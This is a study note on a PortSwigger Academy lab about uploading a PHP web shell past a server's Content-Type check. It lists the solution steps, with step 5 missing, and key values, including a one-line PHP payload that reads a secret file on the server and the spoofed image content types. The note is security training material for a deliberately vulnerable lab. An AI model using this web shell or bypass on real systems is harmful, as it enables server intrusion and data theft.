# Lab: Web shell upload via Content-Type restriction bypass

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

## Lab idea

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. This lab demonstrates the weakness of relying on user-controllable Content-Type information to decide whether an uploaded file is safe. It practices assessing whether validation is based on trustworthy evidence.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> .
3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret.
4. Attempt to upload this script as your avatar.
- …
6. Send the request.
7. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request.
8. Submit the secret to solve the lab.

## Payloads / key values
- `GET`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `image/jpeg`
- `image/png`
- `POST /my-account/avatar`
- `Content-Type`
- `GET /files/avatars/<YOUR-IMAGE>`

## Official source
- [PortSwigger Academy: Lab: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
